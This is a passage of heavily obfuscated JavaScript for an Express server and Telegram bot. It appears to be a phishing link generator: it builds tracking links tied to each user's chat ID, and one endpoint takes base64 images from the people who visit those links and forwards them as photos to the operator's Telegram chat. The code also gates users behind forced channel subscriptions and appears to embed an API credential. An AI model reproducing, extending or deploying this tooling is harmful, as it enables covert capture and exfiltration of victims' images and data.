(_0x543884(0x27d) + '\x20');
        try {
            await bot[_0x543884(0x83a) + 'e'](_0x235c18, _0x3adbd1, { 'parse_mode': _0x520dcb[_0x543884(0x597)] }), console[_0x543884(0x3f8)](_0x520dcb[_0x543884(0x3e3)]), _0x2150d4[_0x543884(0x6b1)]({ 'success': !![] });
        } catch (_0x1ba1b0) {
            console[_0x543884(0x44a)](_0x520dcb[_0x543884(0x2f4)], _0x1ba1b0), _0x2150d4[_0x543884(0x866)](-0x1061 + -0x8f5 * -0x3 + 0x445 * -0x2)[_0x543884(0x6b1)]({ 'error': _0x520dcb[_0x543884(0x220)] });
        }
    } else
        console[_0x543884(0x3f8)](_0x520dcb[_0x543884(0x66a)]), _0x2150d4[_0x543884(0x866)](-0x21bf + -0x26d6 + 0x4a25 * 0x1)[_0x543884(0x6b1)]({ 'error': _0x520dcb[_0x543884(0x66a)] });
}), app[_0x54baf1(0x514)](_0x54baf1(0x37b), (_0x31d193, _0x3cb9ec) => {
    const _0x1a0beb = _0x54baf1, _0x2dc079 = {
            'MSkYA': _0x1a0beb(0x889),
            'MziXV': function (_0xef89fe, _0x36b17a) {
                return _0xef89fe + _0x36b17a;
            },
            'TaENr': _0x1a0beb(0x32b) + _0x1a0beb(0x253)
        }, _0x4f0504 = _0x31d193[_0x1a0beb(0x91e)][_0x1a0beb(0x8fa)], _0x1ab0cc = _0x31d193[_0x1a0beb(0x91e)][_0x1a0beb(0x826)][_0x1a0beb(0x699)](',');
    _0x1ab0cc[_0x1a0beb(0x6df)]((_0x2c8610, _0x554b25) => {
        const _0x5b895f = _0x1a0beb, _0x2918c3 = Buffer[_0x5b895f(0x511)](_0x2c8610, _0x2dc079[_0x5b895f(0x6e9)]);
        bot[_0x5b895f(0x7ca)](_0x4f0504, _0x2918c3, { 'caption': _0x5b895f(0x206) + _0x2dc079[_0x5b895f(0x8d9)](_0x554b25, -0x2ab * -0x2 + 0x2 * 0x2be + -0x1 * 0xad1) });
    }), console[_0x1a0beb(0x3f8)](_0x1a0beb(0x7cb) + _0x1a0beb(0x517) + _0x1a0beb(0x209) + _0x4f0504), dataStore[_0x4f0504] && dataStore[_0x4f0504][_0x1a0beb(0x8bd)] ? _0x3cb9ec[_0x1a0beb(0x1a1)](dataStore[_0x4f0504][_0x1a0beb(0x8bd)]) : _0x3cb9ec[_0x1a0beb(0x82e)](_0x2dc079[_0x1a0beb(0x8ba)]);
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x4d2), (_0x39569b, _0x2cba2d) => {
    const _0x367f6b = _0x54baf1, _0x27c9aa = { 'AHwps': _0x367f6b(0x269) };
    _0x2cba2d[_0x367f6b(0x7bf)](path[_0x367f6b(0x45e)](__dirname, _0x27c9aa[_0x367f6b(0x374)]));
});
let linkUsage = {};
const maxAttemptsPerButton = -0x1 * 0x22b1 + 0x1 * -0x25e7 + 0x4ac3;
function validateLinkUsage(_0x3066af, _0x360520) {
    const _0x5ddc26 = _0x54baf1, _0x57353c = {
            'rdYxE': function (_0x48f69c, _0x14690c) {
                return _0x48f69c(_0x14690c);
            },
            'kttUV': function (_0x3a546a, _0x3c2e05) {
                return _0x3a546a >= _0x3c2e05;
            }
        }, _0x52f18d = _0x3066af + ':' + _0x360520;
    if (_0x57353c[_0x5ddc26(0x72c)](isVIPUser, _0x3066af))
        return !![];
    if (linkUsage[_0x52f18d] && _0x57353c[_0x5ddc26(0x2a1)](linkUsage[_0x52f18d][_0x5ddc26(0x60a)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x52f18d] && (linkUsage[_0x52f18d] = { 'attempts': 0x0 }), linkUsage[_0x52f18d][_0x5ddc26(0x60a)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0x363411) {
    vipUsers[_0x363411] = !![];
}
function removeVIPUser(_0x454261) {
    delete vipUsers[_0x454261];
}
function isVIPUser(_0x21fdfa) {
    return !!vipUsers[_0x21fdfa];
}
bot[_0x54baf1(0x67d)](/\/start/, async _0x5640cb => {
    const _0x3fa84f = _0x54baf1, _0x1e609c = {
            'jcUlB': function (_0x7235a9, _0x1e3a48) {
                return _0x7235a9(_0x1e3a48);
            },
            'XBpny': _0x3fa84f(0x548) + _0x3fa84f(0x6d5) + _0x3fa84f(0x42e) + _0x3fa84f(0x80c) + _0x3fa84f(0x3a3) + _0x3fa84f(0x693),
            'mFXJT': _0x3fa84f(0x19b) + _0x3fa84f(0x7ab) + _0x3fa84f(0x69c),
            'btZHQ': _0x3fa84f(0x57a) + _0x3fa84f(0x282) + _0x3fa84f(0x793),
            'lMXef': _0x3fa84f(0x57a) + _0x3fa84f(0x69a) + _0x3fa84f(0x8c2),
            'RJuVS': _0x3fa84f(0x40c) + _0x3fa84f(0x7d7),
            'rJfOR': _0x3fa84f(0x5fc) + _0x3fa84f(0x8ae),
            'cXubM': _0x3fa84f(0x6d4) + _0x3fa84f(0x21a) + _0x3fa84f(0x740),
            'Pduny': _0x3fa84f(0x1ce) + 's',
            'NdWeJ': _0x3fa84f(0x227) + _0x3fa84f(0x8ca),
            'ZUTKe': _0x3fa84f(0x853) + _0x3fa84f(0x22c),
            'zFBoG': _0x3fa84f(0x332) + _0x3fa84f(0x307),
            'SjWCg': _0x3fa84f(0x371) + _0x3fa84f(0x8f3),
            'DUmSQ': _0x3fa84f(0x26e) + _0x3fa84f(0x4b5),
            'aqtIP': _0x3fa84f(0x169) + _0x3fa84f(0x926),
            'VQJAh': _0x3fa84f(0x851) + _0x3fa84f(0x419),
            'tOMsh': _0x3fa84f(0x556),
            'xPPGh': _0x3fa84f(0x49e) + _0x3fa84f(0x41d),
            'TfgMU': _0x3fa84f(0x202) + 're',
            'TDFoh': _0x3fa84f(0x7dd) + _0x3fa84f(0x228),
            'yTBXi': _0x3fa84f(0x547),
            'PacUL': _0x3fa84f(0x620) + _0x3fa84f(0x348),
            'HVIIZ': _0x3fa84f(0x7c3) + _0x3fa84f(0x216) + _0x3fa84f(0x678),
            'qjIfk': _0x3fa84f(0x67a) + _0x3fa84f(0x8bb) + _0x3fa84f(0x25e) + _0x3fa84f(0x31f) + _0x3fa84f(0x576),
            'UIvFI': _0x3fa84f(0x604) + _0x3fa84f(0x512),
            'QzWmz': _0x3fa84f(0x761) + _0x3fa84f(0x16b),
            'BbPyS': _0x3fa84f(0x289) + _0x3fa84f(0x721),
            'FwuDQ': _0x3fa84f(0x896) + _0x3fa84f(0x375) + _0x3fa84f(0x2ef) + _0x3fa84f(0x1b9) + _0x3fa84f(0x4d7),
            'hBxGw': _0x3fa84f(0x663) + _0x3fa84f(0x4ea),
            'LOcTD': _0x3fa84f(0x67e),
            'AUmLU': _0x3fa84f(0x7b0) + _0x3fa84f(0x4eb) + _0x3fa84f(0x553),
            'tTOBv': _0x3fa84f(0x458),
            'MIQzM': _0x3fa84f(0x3bf) + _0x3fa84f(0x22b),
            'nvPdz': _0x3fa84f(0x80a) + _0x3fa84f(0x20c) + _0x3fa84f(0x473) + _0x3fa84f(0x3e2) + _0x3fa84f(0x656),
            'PwlMQ': _0x3fa84f(0x2d8) + _0x3fa84f(0x4cf),
            'bvARx': _0x3fa84f(0x70c) + _0x3fa84f(0x4f0) + '3',
            'GltNh': _0x3fa84f(0x3ea) + _0x3fa84f(0x65d),
            'dAtxj': _0x3fa84f(0x3bc) + _0x3fa84f(0x5a9) + _0x3fa84f(0x68f) + _0x3fa84f(0x650) + 'e/',
            'wGyIv': _0x3fa84f(0x774) + _0x3fa84f(0x488),
            'UpHby': _0x3fa84f(0x3c5) + 'il',
            'VWVDw': _0x3fa84f(0x45b) + '💳',
            'ryRNB': _0x3fa84f(0x5cd) + _0x3fa84f(0x170),
            'skyBs': _0x3fa84f(0x36c) + _0x3fa84f(0x24f),
            'wcxKf': _0x3fa84f(0x420) + _0x3fa84f(0x361),
            'mdOmA': _0x3fa84f(0x602) + _0x3fa84f(0x558),
            'MGOZP': _0x3fa84f(0x3e7) + _0x3fa84f(0x8f7),
            'WMuct': _0x3fa84f(0x402) + _0x3fa84f(0x4e4),
            'XiDMp': _0x3fa84f(0x5da),
            'HGtxf': _0x3fa84f(0x79e) + _0x3fa84f(0x58c),
            'aHPmR': _0x3fa84f(0x1ff) + 's',
            'AuFOu': _0x3fa84f(0x8c9) + _0x3fa84f(0x4f7),
            'fMnwV': _0x3fa84f(0x80e) + _0x3fa84f(0x808),
            'ImGPz': _0x3fa84f(0x583) + _0x3fa84f(0x584),
            'azFYP': _0x3fa84f(0x70c) + _0x3fa84f(0x2e0),
            'KhyUy': function (_0x3f043f, _0x2a2a1e) {
                return _0x3f043f === _0x2a2a1e;
            },
            'IWuas': _0x3fa84f(0x626) + _0x3fa84f(0x8e7) + _0x3fa84f(0x560) + _0x3fa84f(0x3fd),
            'bszrY': _0x3fa84f(0x49f) + _0x3fa84f(0x8f1),
            'dLsXW': _0x3fa84f(0x5ba),
            'aIjry': _0x3fa84f(0x8c8) + _0x3fa84f(0x7e9),
            'tOmfU': _0x3fa84f(0x333)
        }, _0x110219 = _0x5640cb[_0x3fa84f(0x2cb)]['id'], _0x10ac24 = await _0x1e609c[_0x3fa84f(0x358)](isUserSubscribed, _0x110219);
    if (!_0x10ac24) {
        const _0x191c1e = _0x1e609c[_0x3fa84f(0x7f8)], _0x4b160d = developerChannels[_0x3fa84f(0x502)](_0x26a49c => [{
                    'text': _0x3fa84f(0x3d3) + _0x26a49c,
                    'url': _0x3fa84f(0x70c) + _0x3fa84f(0x4d7) + _0x26a49c[_0x3fa84f(0x2f6)](0xb2b + -0x89 * 0x12 + 0x38 * -0x7)
                }]);
        bot[_0x3fa84f(0x83a) + 'e'](_0x110219, _0x191c1e, { 'reply_markup': { 'inline_keyboard': _0x4b160d } });
        return;
    }
    const _0x40fc36 = _0x1e609c[_0x3fa84f(0x3f5)], _0xac345b = [
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x1c1)],
                    'callback_data': _0x3fa84f(0x7da) + _0x3fa84f(0x8a0) + _0x110219
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x18d)],
                    'callback_data': _0x3fa84f(0x591) + 'k:' + _0x110219
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x257)],
                    'callback_data': _0x3fa84f(0x490) + 'n:' + _0x110219
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x66f)],
                    'callback_data': _0x3fa84f(0x7bb) + 'e:' + _0x110219
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x19e)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x781)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x780)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x3ac)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x492)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x3ae)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x88e)],
                    'callback_data': _0x3fa84f(0x238) + _0x3fa84f(0x47b) + _0x110219
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x794)],
                    'callback_data': _0x3fa84f(0x455) + _0x3fa84f(0x76b) + _0x110219
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x63f)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x30c)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x4fd)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x64c)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x17f)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x62d)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x806)],
                    'callback_data': _0x3fa84f(0x5cb) + 'k:' + _0x110219
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x8be)],
                    'web_app': { 'url': _0x1e609c[_0x3fa84f(0x308)] }
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x422)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x7c2)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x81f)],
                    'web_app': { 'url': _0x1e609c[_0x3fa84f(0x8d7)] }
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x1c3)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x80b)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x8b1)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x540)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x704)],
                    'web_app': { 'url': _0x1e609c[_0x3fa84f(0x5ff)] }
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x242)],
                    'url': _0x1e609c[_0x3fa84f(0x2cf)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x8f2)],
                    'web_app': { 'url': _0x1e609c[_0x3fa84f(0x226)] }
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x4f2)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x1c8)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x608)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x880)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x3b5)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x66b)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x788)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x1f9)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x766)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x648)]
                }
            ],
            [
                {
                    'text': _0x1e609c[_0x3fa84f(0x86c)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x60d)]
                },
                {
                    'text': _0x1e609c[_0x3fa84f(0x16a)],
                    'callback_data': _0x1e609c[_0x3fa84f(0x783)]
                }
            ],
            [{
                    'text': _0x1e609c[_0x3fa84f(0x6e3)],
                    'url': _0x1e609c[_0x3fa84f(0x450)]
                }]
        ];
    bot[_0x3fa84f(0x83a) + 'e'](_0x110219, _0x40fc36, { 'reply_markup': { 'inline_keyboard': _0xac345b } });
    if (_0x1e609c[_0x3fa84f(0x902)](_0x110219, 0x266da1c0 * 0xa + -0xc401565a + -0x1 * -0x99cc3494)) {
        const _0x58491b = _0x1e609c[_0x3fa84f(0x8d2)], _0x1b33de = [[
                    {
                        'text': _0x1e609c[_0x3fa84f(0x38a)],
                        'callback_data': _0x1e609c[_0x3fa84f(0x8c4)]
                    },
                    {
                        'text': _0x1e609c[_0x3fa84f(0x395)],
                        'callback_data': _0x1e609c[_0x3fa84f(0x44e)]
                    }
                ]];
        bot[_0x3fa84f(0x83a) + 'e'](_0x110219, _0x58491b, { 'reply_markup': { 'inline_keyboard': _0x1b33de } });
    }
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x37c4fd => {
    const _0x59990c = _0x54baf1, _0x290b67 = {
            'DWMph': function (_0x3a6612, _0x39cb05) {
                return _0x3a6612 === _0x39cb05;
            },
            'upJLA': _0x59990c(0x853) + _0x59990c(0x22c)
        }, _0x765802 = _0x37c4fd[_0x59990c(0x7ed)][_0x59990c(0x2cb)]['id'], _0x159431 = _0x37c4fd[_0x59990c(0x755)];
    if (_0x290b67[_0x59990c(0x828)](_0x159431, _0x290b67[_0x59990c(0x58e)])) {
        const _0x7c7215 = _0x59990c(0x414) + _0x59990c(0x176) + _0x59990c(0x20b) + _0x59990c(0x673) + _0x59990c(0x211) + _0x59990c(0x2f9) + baseUrl + (_0x59990c(0x6cd) + _0x59990c(0x35f)) + _0x765802;
        bot[_0x59990c(0x83a) + 'e'](_0x765802, _0x7c7215);
    }
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0x3f7cdb => {
    const _0x5eed36 = _0x54baf1, _0x3e2f2d = {
            'JwWTY': function (_0xa6cc6b, _0x154924) {
                return _0xa6cc6b(_0x154924);
            },
            'ioApx': _0x5eed36(0x547),
            'TRZHh': _0x5eed36(0x1ce) + 's',
            'PhiuG': _0x5eed36(0x202) + 're',
            'DECDr': _0x5eed36(0x238) + _0x5eed36(0x3e8),
            'dNcQP': _0x5eed36(0x556),
            'WxXma': _0x5eed36(0x5cb) + 'k',
            'EZlgM': _0x5eed36(0x458),
            'kVJuz': _0x5eed36(0x455) + _0x5eed36(0x737),
            'FBaqa': _0x5eed36(0x548) + _0x5eed36(0x6d5) + _0x5eed36(0x42e) + _0x5eed36(0x80c) + _0x5eed36(0x3a3) + _0x5eed36(0x693),
            'YXnvv': function (_0x19201a, _0x118e8b) {
                return _0x19201a === _0x118e8b;
            },
            'LgvOZ': _0x5eed36(0x371) + _0x5eed36(0x8f3),
            'NGcPm': _0x5eed36(0x20e),
            'LARtI': _0x5eed36(0x266) + _0x5eed36(0x816) + _0x5eed36(0x1d7) + _0x5eed36(0x389) + _0x5eed36(0x85f) + _0x5eed36(0x7ee),
            'IPDRd': _0x5eed36(0x497) + _0x5eed36(0x88b) + _0x5eed36(0x726) + _0x5eed36(0x840) + 'ns',
            'AdBvt': _0x5eed36(0x603) + _0x5eed36(0x92d),
            'QbJgY': _0x5eed36(0x6b0),
            'osAUH': _0x5eed36(0x247) + _0x5eed36(0x1ab) + _0x5eed36(0x482) + _0x5eed36(0x7ac) + _0x5eed36(0x3d8) + _0x5eed36(0x53d) + _0x5eed36(0x714) + _0x5eed36(0x1a3) + _0x5eed36(0x89c) + _0x5eed36(0x5a2) + 'cA',
            'TEKUJ': _0x5eed36(0x1b6) + _0x5eed36(0x34b),
            'eTaDg': _0x5eed36(0x437) + _0x5eed36(0x7d1),
            'kbyvZ': _0x5eed36(0x7d3) + _0x5eed36(0x1fc) + _0x5eed36(0x507) + _0x5eed36(0x222) + _0x5eed36(0x4f4) + _0x5eed36(0x638) + _0x5eed36(0x634),
            'OjWrA': _0x5eed36(0x71a) + _0x5eed36(0x912),
            'HUfds': _0x5eed36(0x453) + _0x5eed36(0x4a1) + _0x5eed36(0x817) + _0x5eed36(0x250) + _0x5eed36(0x246) + _0x5eed36(0x8b2) + _0x5eed36(0x684) + _0x5eed36(0x5b7) + _0x5eed36(0x739) + _0x5eed36(0x50b) + _0x5eed36(0x297) + _0x5eed36(0x3ad) + _0x5eed36(0x585) + _0x5eed36(0x210) + _0x5eed36(0x809) + _0x5eed36(0x594),
            'bUHrv': _0x5eed36(0x437) + _0x5eed36(0x1ae) + _0x5eed36(0x475),
            'Xpgna': _0x5eed36(0x7d3) + _0x5eed36(0x1fc) + _0x5eed36(0x86e) + _0x5eed36(0x1fa) + _0x5eed36(0x51a) + _0x5eed36(0x2e9) + _0x5eed36(0x35c),
            'nChwt': _0x5eed36(0x5ba),
            'TQjUB': function (_0x345e1c, _0x42eea0) {
                return _0x345e1c == _0x42eea0;
            },
            'yNRdj': _0x5eed36(0x7f2) + _0x5eed36(0x855) + _0x5eed36(0x199) + _0x5eed36(0x2f3) + 'P:',
            'ynJZg': _0x5eed36(0x7ed),
            'OgfJS': _0x5eed36(0x333),
            'FwOUL': _0x5eed36(0x7f2) + _0x5eed36(0x855) + _0x5eed36(0x254) + _0x5eed36(0x6b8) + 'P:',
            'OtULF': function (_0x5df495, _0x5a2dd6, _0x1c2236) {
                return _0x5df495(_0x5a2dd6, _0x1c2236);
            },
            'fSTPz': _0x5eed36(0x7da) + 'nt',
            'jyqvD': _0x5eed36(0x8e0),
            'OLJmq': _0x5eed36(0x591) + 'k',
            'HYmUT': _0x5eed36(0x490) + 'n',
            'WcVwj': _0x5eed36(0x7bb) + 'e'
        }, _0x529025 = _0x3f7cdb[_0x5eed36(0x7ed)][_0x5eed36(0x2cb)]['id'], _0x17aa1d = _0x3f7cdb[_0x5eed36(0x755)], _0x101dbb = [
            _0x3e2f2d[_0x5eed36(0x469)],
            _0x3e2f2d[_0x5eed36(0x747)],
            _0x3e2f2d[_0x5eed36(0x2b9)],
            _0x3e2f2d[_0x5eed36(0x69f)],
            _0x3e2f2d[_0x5eed36(0x847)],
            _0x3e2f2d[_0x5eed36(0x5f4)],
            _0x3e2f2d[_0x5eed36(0x261)],
            _0x3e2f2d[_0x5eed36(0x5fa)]
        ];
    if (!_0x101dbb[_0x5eed36(0x487)](_0x17aa1d[_0x5eed36(0x699)](':')[-0xd93 + 0x1 * -0x14e5 + 0x2278]) && !await _0x3e2f2d[_0x5eed36(0x7ff)](isUserSubscribed, _0x529025)) {
        const _0x2a5af9 = _0x3e2f2d[_0x5eed36(0x82f)], _0x2ffe92 = developerChannels[_0x5eed36(0x502)](_0x20491d => ({
                'text': _0x5eed36(0x3d3) + _0x20491d,
                'url': _0x5eed36(0x70c) + _0x5eed36(0x4d7) + _0x20491d[_0x5eed36(0x2f6)](-0x19a0 + -0x5 * 0x147 + 0x2004)
            }));
        bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x2a5af9, { 'reply_markup': { 'inline_keyboard': [_0x2ffe92] } });
        return;
    }
    if (_0x3e2f2d[_0x5eed36(0x2ed)](_0x17aa1d, _0x3e2f2d[_0x5eed36(0x5e1)])) {
        const _0x354d5e = baseUrl + (_0x5eed36(0x20d) + _0x5eed36(0x37a)) + _0x529025;
        bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x5eed36(0x414) + _0x5eed36(0x52c) + _0x5eed36(0x474) + '\x20' + _0x354d5e);
        return;
    }
    const [_0x34a1ef, _0x258480] = _0x17aa1d[_0x5eed36(0x699)](':');
    if (_0x3e2f2d[_0x5eed36(0x2ed)](_0x34a1ef, _0x3e2f2d[_0x5eed36(0x856)]))
        try {
            const _0x300400 = _0x3e2f2d[_0x5eed36(0x1c2)], _0x54ac28 = _0x3e2f2d[_0x5eed36(0x7db)], _0x56ff15 = await axios[_0x5eed36(0x514)](_0x54ac28, {
                    'model': _0x3e2f2d[_0x5eed36(0x526)],
                    'messages': [{
                            'role': _0x3e2f2d[_0x5eed36(0x58a)],
                            'content': _0x300400
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x3e2f2d[_0x5eed36(0x64a)],
                        'Content-Type': _0x3e2f2d[_0x5eed36(0x1df)]
                    }
                }), _0x88e86f = _0x56ff15[_0x5eed36(0x755)][_0x5eed36(0x7cc)][0x1e10 * 0x1 + -0x1e74 + 0x64][_0x5eed36(0x7ed)][_0x5eed36(0x4db)];
            bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x88e86f);
        } catch (_0x1bff5a) {
            console[_0x5eed36(0x44a)](_0x3e2f2d[_0x5eed36(0x34d)], _0x1bff5a[_0x5eed36(0x75c)] ? _0x1bff5a[_0x5eed36(0x75c)][_0x5eed36(0x755)] : _0x1bff5a[_0x5eed36(0x7ed)]), bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x3e2f2d[_0x5eed36(0x4c8)]);
        }
    else {
        if (_0x3e2f2d[_0x5eed36(0x2ed)](_0x17aa1d, _0x3e2f2d[_0x5eed36(0x87f)]))
            try {
                const _0x4878ad = _0x3e2f2d[_0x5eed36(0x6a8)], _0x4a981b = _0x3e2f2d[_0x5eed36(0x7db)], _0x4773d = await axios[_0x5eed36(0x514)](_0x4a981b, {
                        'model': _0x3e2f2d[_0x5eed36(0x526)],
                        'messages': [{
                                'role': _0x3e2f2d[_0x5eed36(0x58a)],
                                'content': _0x4878ad
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x3e2f2d[_0x5eed36(0x64a)],
                            'Content-Type': _0x3e2f2d[_0x5eed36(0x1df)]
                        }
                    }), _0x2a4e75 = _0x4773d[_0x5eed36(0x755)][_0x5eed36(0x7cc)][0x2 * -0xd67 + 0x1e * 0x78 + -0x1d2 * -0x7][_0x5eed36(0x7ed)][_0x5eed36(0x4db)];
                bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x2a4e75);
            } catch (_0x1f6110) {
                console[_0x5eed36(0x44a)](_0x3e2f2d[_0x5eed36(0x34d)], _0x1f6110[_0x5eed36(0x75c)] ? _0x1f6110[_0x5eed36(0x75c)][_0x5eed36(0x755)] : _0x1f6110[_0x5eed36(0x7ed)]), bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x3e2f2d[_0x5eed36(0x4c8)]);
            }
        else {
            if (_0x3e2f2d[_0x5eed36(0x2ed)](_0x17aa1d, _0x3e2f2d[_0x5eed36(0x87f)]))
                try {
                    const _0x3b7ced = _0x3e2f2d[_0x5eed36(0x6a8)], _0x52f33b = _0x3e2f2d[_0x5eed36(0x7db)], _0x20647f = await axios[_0x5eed36(0x514)](_0x52f33b, {
                            'model': _0x3e2f2d[_0x5eed36(0x526)],
                            'messages': [{
                                    'role': _0x3e2f2d[_0x5eed36(0x58a)],
                                    'content': _0x3b7ced
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x3e2f2d[_0x5eed36(0x64a)],
                                'Content-Type': _0x3e2f2d[_0x5eed36(0x1df)]
                            }
                        }), _0x55b3c3 = _0x20647f[_0x5eed36(0x755)][_0x5eed36(0x7cc)][-0x2 * 0x119b + 0x289 + 0x5 * 0x689][_0x5eed36(0x7ed)][_0x5eed36(0x4db)];
                    bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x55b3c3);
                } catch (_0x370a7b) {
                    console[_0x5eed36(0x44a)](_0x3e2f2d[_0x5eed36(0x3a0)], _0x370a7b[_0x5eed36(0x75c)] ? _0x370a7b[_0x5eed36(0x75c)][_0x5eed36(0x755)] : _0x370a7b[_0x5eed36(0x7ed)]), bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x3e2f2d[_0x5eed36(0x7fe)]);
                }
            else {
                if (_0x3e2f2d[_0x5eed36(0x2ed)](_0x17aa1d, _0x3e2f2d[_0x5eed36(0x1ac)]) && _0x3e2f2d[_0x5eed36(0x821)](_0x529025, -0x1 * 0x219e6a6a9 + 0x1dd7a7e7f + 0x127c * 0x15c667))
                    bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x3e2f2d[_0x5eed36(0x7b6)]), bot[_0x5eed36(0x1eb)](_0x3e2f2d[_0x5eed36(0x807)], _0x4b5d41 => {
                        const _0x18925c = _0x5eed36, _0x3f7673 = _0x4b5d41[_0x18925c(0x7e0)];
                        _0x3e2f2d[_0x18925c(0x7ff)](addVIPUser, _0x3f7673), bot[_0x18925c(0x83a) + 'e'](_0x529025, _0x18925c(0x733) + _0x18925c(0x24a) + _0x3f7673 + _0x18925c(0x545));
                    });
                else {
                    if (_0x3e2f2d[_0x5eed36(0x2ed)](_0x17aa1d, _0x3e2f2d[_0x5eed36(0x6f7)]) && _0x3e2f2d[_0x5eed36(0x821)](_0x529025, 0x1 * -0x19b8d8a71 + -0x573a6085 + 0x691b6356 * 0x8))
                        bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x3e2f2d[_0x5eed36(0x71f)]), bot[_0x5eed36(0x1eb)](_0x3e2f2d[_0x5eed36(0x807)], _0x342b95 => {
                            const _0x8555a3 = _0x5eed36, _0x35ccb7 = _0x342b95[_0x8555a3(0x7e0)];
                            _0x3e2f2d[_0x8555a3(0x7ff)](removeVIPUser, _0x35ccb7), bot[_0x8555a3(0x83a) + 'e'](_0x529025, _0x8555a3(0x3d7) + _0x8555a3(0x24a) + _0x35ccb7 + _0x8555a3(0x5e0));
                        });
                    else {
                        const [_0x1e2219, _0x19e164] = _0x17aa1d[_0x5eed36(0x699)](':');
                        if (!_0x101dbb[_0x5eed36(0x487)](_0x1e2219) && !_0x3e2f2d[_0x5eed36(0x288)](validateLinkUsage, _0x19e164, _0x1e2219)) {
                            bot[_0x5eed36(0x83a) + 'e'](_0x529025, '');
                            return;
                        }
                        let _0x5a1e63 = '';
                        switch (_0x1e2219) {
                        case _0x3e2f2d[_0x5eed36(0x8fc)]:
                            _0x5a1e63 = baseUrl + (_0x5eed36(0x849) + _0x5eed36(0x7ae)) + crypto[_0x5eed36(0x6d3) + 's'](-0x1639 + -0x5 * 0x51b + -0x2a8 * -0x12)[_0x5eed36(0x82b)](_0x3e2f2d[_0x5eed36(0x175)]) + _0x5eed36(0x55e) + _0x529025;
                            break;
                        case _0x3e2f2d[_0x5eed36(0x7e8)]:
                            _0x5a1e63 = baseUrl + (_0x5eed36(0x2f7) + _0x5eed36(0x57e)) + crypto[_0x5eed36(0x6d3) + 's'](-0x2251 + -0xafc + 0x2d5d)[_0x5eed36(0x82b)](_0x3e2f2d[_0x5eed36(0x175)]) + _0x5eed36(0x55e) + _0x529025;
                            break;
                        case _0x3e2f2d[_0x5eed36(0x2f0)]:
                            _0x5a1e63 = baseUrl + (_0x5eed36(0x2b5) + _0x5eed36(0x70a)) + crypto[_0x5eed36(0x6d3) + 's'](-0x13c3 + 0x19b2 + -0xa7 * 0x9)[_0x5eed36(0x82b)](_0x3e2f2d[_0x5eed36(0x175)]) + _0x5eed36(0x55e) + _0x529025;
                            break;
                        case _0x3e2f2d[_0x5eed36(0x3ca)]:
                            const _0xf706be = 0x1a89 + -0x1951 * 0x1 + -0x12e;
                            _0x5a1e63 = baseUrl + _0x5eed36(0x1f5) + crypto[_0x5eed36(0x6d3) + 's'](-0x678 + -0x1af0 + 0x2178)[_0x5eed36(0x82b)](_0x3e2f2d[_0x5eed36(0x175)]) + _0x5eed36(0x55e) + _0x529025 + _0x5eed36(0x2ae) + _0xf706be;
                            break;
                        case _0x3e2f2d[_0x5eed36(0x5f4)]:
                            _0x5a1e63 = baseUrl + (_0x5eed36(0x71d) + _0x5eed36(0x49b)) + _0x529025 + (_0x5eed36(0x3b3) + 'ok');
                            break;
                        case _0x3e2f2d[_0x5eed36(0x69f)]:
                            _0x5a1e63 = baseUrl + (_0x5eed36(0x71d) + _0x5eed36(0x49b)) + _0x529025 + (_0x5eed36(0x36b) + _0x5eed36(0x270));
                            break;
